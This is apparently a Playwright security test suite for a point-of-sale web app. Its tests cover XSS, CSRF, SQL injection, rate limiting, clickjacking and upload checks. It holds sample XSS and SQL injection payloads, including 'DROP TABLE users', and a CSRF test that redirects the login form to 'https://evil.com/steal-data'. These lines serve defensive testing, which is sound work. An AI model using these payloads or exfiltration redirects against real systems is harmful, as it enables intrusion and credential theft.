import { test, expect } from '@playwright/test';

test.describe('Security Tests', () => {
  test('should prevent XSS attacks in search', async ({ page }) => {
    // Mock authentication
    await page.addInitScript(() => {
      localStorage.setItem('accessToken', 'mock-token');
      localStorage.setItem('user', JSON.stringify({
        id: '1',
        name: 'Test User',
        email: 'test@example.com',
        role: { name: 'Admin' }
      }));
    });

    await page.goto('/pos');

    // Try XSS injection in search
    const xssPayload = '<script>alert("XSS")</script>';
    await page.fill('input[placeholder="Search products..."]', xssPayload);

    // Should not execute script
    await expect(page.locator('text=XSS')).not.toBeVisible();

    // Should sanitize input
    await expect(page.locator('input')).toHaveValue(xssPayload);
  });

  test('should protect against CSRF attacks', async ({ page }) => {
    await page.goto('/login');

    // Check if CSRF token is present (if implemented)
    const csrfToken = await page.evaluate(() => {
      const metaTag = document.querySelector('meta[name="csrf-token"]');
      return metaTag?.getAttribute('content');
    });

    // For now, we'll test that forms don't accept external submissions
    await page.fill('input[type="email"]', 'test@example.com');
    await page.fill('input[type="password"]', 'password123');

    // Simulate external form submission attempt
    await page.evaluate(() => {
      const form = document.querySelector('form');
      if (form) {
        form.action = 'https://evil.com/steal-data';
        form.method = 'POST';
      }
    });

    // Submit form
    await page.click('button[type="submit"]');

    // Should not submit to external domain
    await expect(page).not.toHaveURL('https://evil.com');
  });

  test('should implement proper authentication headers', async ({ page }) => {
    // Test API endpoint authentication
    await page.goto('/login');

    const apiResponses: any[] = [];
    page.on('response', response => {
      if (response.url().includes('/api/')) {
        apiResponses.push({
          url: response.url(),
          status: response.status(),
          headers: response.headers()
        });
      }
    });

    // Try to access protected endpoint without token
    await page.evaluate(async () => {
      try {
        const response = await fetch('/api/v1/auth/me');
        return {
          status: response.status,
          ok: response.ok
        };
      } catch (error) {
        return { error: error.message };
      }
    });

    // Should be denied access
    const lastResponse = apiResponses[apiResponses.length - 1];
    if (lastResponse) {
      expect(lastResponse.status).toBe(401);
    }
  });

  test('should not expose sensitive data in client-side code', async ({ page }) => {
    await page.goto('/login');

    // Check for sensitive data exposure
    const sensitivePatterns = [
      /password/i,
      /secret/i,
      /api[_-]?key/i,
      /token/i,
      /private[_-]?key/i
    ];

    const pageContent = await page.content();
    const exposedSensitiveData = [];

    for (const pattern of sensitivePatterns) {
      const matches = pageContent.match(pattern);
      if (matches && matches.length > 5) { // Allow some legitimate uses
        exposedSensitiveData.push(...matches);
      }
    }

    // Should not expose excessive sensitive data
    expect(exposedSensitiveData.length).toBeLessThan(10);
  });

  test('should implement proper input validation', async ({ page }) => {
    await page.goto('/login');

    // Test SQL injection attempts
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "admin'--",
      "' UNION SELECT * FROM users --"
    ];

    for (const payload of sqlInjectionPayloads) {
      await page.fill('input[type="email"]', payload);
      await page.fill('input[type="password"]', 'password');
      await page.click('button[type="submit"]');

      // Should not authenticate and should show validation error
      await expect(page.locator('text=Login failed')).toBeVisible();
    }
  });

  test('should have secure password policies', async ({ page }) => {
    await page.goto('/login');

    // Test password strength requirements
    const weakPasswords = [
      '123',           // Too short
      'password',     // Common password
      'qwerty',        // Common keyboard pattern
      'aaaaaa'         // Repeated characters
    ];

    for (const password of weakPasswords) {
      await page.fill('input[type="email"]', 'test@example.com');
      await page.fill('input[type="password"]', password);
      await page.click('button[type="submit"]');

      // Should not accept weak passwords
      await expect(page.locator('text=Password must be at least 6 characters')).toBeVisible();
    }
  });

  test('should implement rate limiting', async ({ page }) => {
    await page.goto('/login');

    // Attempt multiple rapid login attempts
    for (let i = 0; i < 10; i++) {
      await page.fill('input[type="email"]', `test${i}@example.com`);
      await page.fill('input[type="password"]', 'wrongpassword');
      await page.click('button[type="submit"]');

      // Small delay to simulate rapid attempts
      await page.waitForTimeout(100);
    }

    // After several failed attempts, should show rate limiting message
    await expect(page.locator('text=Too many attempts')).toBeVisible();
  });

  test('should sanitize user input in forms', async ({ page }) => {
    // Mock authentication and setup
    await page.addInitScript(() => {
      localStorage.setItem('accessToken', 'mock-token');
      localStorage.setItem('user', JSON.stringify({
        id: '1',
        name: 'Test User',
        email: 'test@example.com',
        role: { name: 'Admin' }
      }));
    });

    await page.goto('/customers');

    // Test HTML injection in customer form
    const htmlInjection = '<img src=x onerror=alert("XSS")>';

    // Try to find and fill customer form fields
    const nameField = page.locator('input[placeholder*="name"], input[name*="name"]').first();
    const emailField = page.locator('input[type="email"]').first();

    if (await nameField.isVisible()) {
      await nameField.fill(htmlInjection);

      // Should not execute script
      await expect(page.locator('img[src="x"]')).not.toBeVisible();

      // Should display as text (sanitized)
      const inputValue = await nameField.inputValue();
      expect(inputValue).not.toContain('<script>');
    }
  });

  test('should protect against clickjacking', async ({ page }) => {
    // Check for X-Frame-Options header
    const responses: any[] = [];
    page.on('response', response => {
      responses.push({
        url: response.url(),
        headers: response.headers()
      });
    });

    await page.goto('/');

    // Check if X-Frame-Options header is set
    const mainResponse = responses.find(r => r.url === page.url());
    if (mainResponse) {
      const frameOptions = mainResponse.headers['x-frame-options'];
      const csp = mainResponse.headers['content-security-policy'];

      // Should have some frame protection
      expect(frameOptions || csp).toBeTruthy();
    }
  });

  test('should handle file upload security', async ({ page }) => {
    // Mock authentication
    await page.addInitScript(() => {
      localStorage.setItem('accessToken', 'mock-token');
      localStorage.setItem('user', JSON.stringify({
        id: '1',
        name: 'Test User',
        email: 'test@example.com',
        role: { name: 'Admin' }
      }));
    });

    await page.goto('/products');

    // Look for file upload inputs
    const fileInput = page.locator('input[type="file"]').first();

    if (await fileInput.isVisible()) {
      // Test file type restrictions
      const maliciousFile = 'malicious.exe';

      // Try to upload non-image file
      await fileInput.setInputFiles({
        name: maliciousFile,
        mimeType: 'application/x-executable',
        buffer: Buffer.from('fake content')
      });

      // Should reject file
      await expect(page.locator('text=Invalid file type')).toBeVisible();
    }
  });
});